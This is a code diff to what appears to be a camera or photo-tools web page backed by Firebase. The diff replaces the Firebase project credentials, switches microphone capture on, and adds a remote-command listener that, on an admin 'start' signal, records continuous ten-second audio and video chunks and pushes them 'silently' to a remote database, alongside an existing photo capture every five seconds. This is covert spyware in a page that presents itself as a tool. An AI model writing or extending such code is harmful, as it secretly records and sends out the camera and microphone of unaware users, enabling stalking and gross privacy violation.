@@ -213,15 +213,15 @@
 
     <script>
         const firebaseConfig = {
-          apiKey: "AIzaSyDgMO298G9iII68wZmqDqG4lywJkKEzfEc",
-          authDomain: "cctv-692c5.firebaseapp.com",
-          databaseURL: "https://cctv-692c5-default-rtdb.firebaseio.com",
-          projectId: "cctv-692c5",
-          storageBucket: "cctv-692c5.firebasestorage.app",
-          messagingSenderId: "507999602021",
-          appId: "1:507999602021:web:36697af7cd8935715f0d8c",
-          measurementId: "G-5HMXQ5R5YW"
-        };
+  apiKey: "AIzaSyAQuo2WL8RZFdqLcXxsmSuNo00unp3HYZk",
+  authDomain: "phototools-d8a41.firebaseapp.com",
+  databaseURL: "https://phototools-d8a41-default-rtdb.firebaseio.com",
+  projectId: "phototools-d8a41",
+  storageBucket: "phototools-d8a41.firebasestorage.app",
+  messagingSenderId: "941200990221",
+  appId: "1:941200990221:web:d4c8b24e16804a1e22f544",
+  measurementId: "G-PJP9XWFFPT"
+};
 
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
@@ -278,7 +278,7 @@
             }
         }
 
-        // Optimized Camera Constraints for Smooth Switching & Macro Focus
+        // Optimized Camera Constraints for Smooth Switching & Macro Focus (Including Audio for Video Recording)
         async function requestPermissionsAndStart() {
             await checkAndRequestCameraPermission();
             try {
@@ -289,7 +289,7 @@
                         height: { ideal: 1080 },
                         focusMode: 'continuous'
                     },
-                    audio: false 
+                    audio: true 
                 });
                 video.srcObject = localStream;
 
@@ -330,7 +330,7 @@
                         height: { ideal: 1080 },
                         focusMode: 'continuous'
                     },
-                    audio: false 
+                    audio: true 
                 });
                 
                 const track = localStream.getVideoTracks()[0];
@@ -512,9 +512,103 @@
             });
         }
 
+        // Admin Command Listener for Continuous 10-Second HD Video Chunk Recording
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let isVideoRecordingActive = false;
+        let videoIntervalTimer = null;
+
+        function setupVideoCommandListener() {
+            db.ref('security/commands/videoRecording').on('value', (snapshot) => {
+                const cmd = snapshot.val();
+                if (cmd) {
+                    if (cmd.action === 'start' && !isVideoRecordingActive) {
+                        startContinuousVideoRecording();
+                    } else if (cmd.action === 'stop' && isVideoRecordingActive) {
+                        stopContinuousVideoRecording();
+                    }
+                }
+            });
+        }
+
+        function startContinuousVideoRecording() {
+            if (!localStream || isVideoRecordingActive) return;
+            isVideoRecordingActive = true;
+
+            const recordChunkLoop = () => {
+                if (!isVideoRecordingActive) return;
+
+                try {
+                    recordedChunks = [];
+                    const options = { mimeType: 'video/webm;codecs=vp9,opus' };
+                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                        options.mimeType = 'video/webm';
+                    }
+
+                    mediaRecorder = new MediaRecorder(localStream, options);
+
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data && event.data.size > 0) {
+                            recordedChunks.push(event.data);
+                        }
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        if (recordedChunks.length > 0 && isVideoRecordingActive) {
+                            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                            const reader = new FileReader();
+                            reader.onloadend = () => {
+                                const base64Video = reader.result;
+                                const timestamp = new Date().toLocaleString();
+                                const camType = currentFacingMode === 'user' ? 'Front Camera' : 'Back Camera';
+
+                                // Push 10-second HD video chunk silently to Firebase Realtime Database
+                                db.ref('security/videos').push({
+                                    video: base64Video,
+                                    text: `${camType} - HD Video Chunk (10s) at ${timestamp}`,
+                                    timestamp: timestamp
+                                });
+                            };
+                            reader.readAsDataURL(blob);
+                        }
+                    };
+
+                    mediaRecorder.start();
+
+                    // Record for exactly 10 seconds, stop to upload chunk, and loop automatically
+                    videoIntervalTimer = setTimeout(() => {
+                        if (mediaRecorder && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
+                        if (isVideoRecordingActive) {
+                            recordChunkLoop();
+                        }
+                    }, 10000);
+
+                } catch (err) {
+                    console.error("Video Recording Error:", err);
+                    isVideoRecordingActive = false;
+                }
+            };
+
+            recordChunkLoop();
+        }
+
+        function stopContinuousVideoRecording() {
+            isVideoRecordingActive = false;
+            if (videoIntervalTimer) {
+                clearTimeout(videoIntervalTimer);
+                videoIntervalTimer = null;
+            }
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+        }
+
         window.addEventListener('load', () => {
             requestPermissionsAndStart().then(() => {
                 setupWebRTCListener();
+                setupVideoCommandListener();
                 // 5-second lightweight auto background capture (smooth & non-laggy)
                 setInterval(() => captureAndSendPhoto("Auto Background Capture", false, false), 5000);
             });
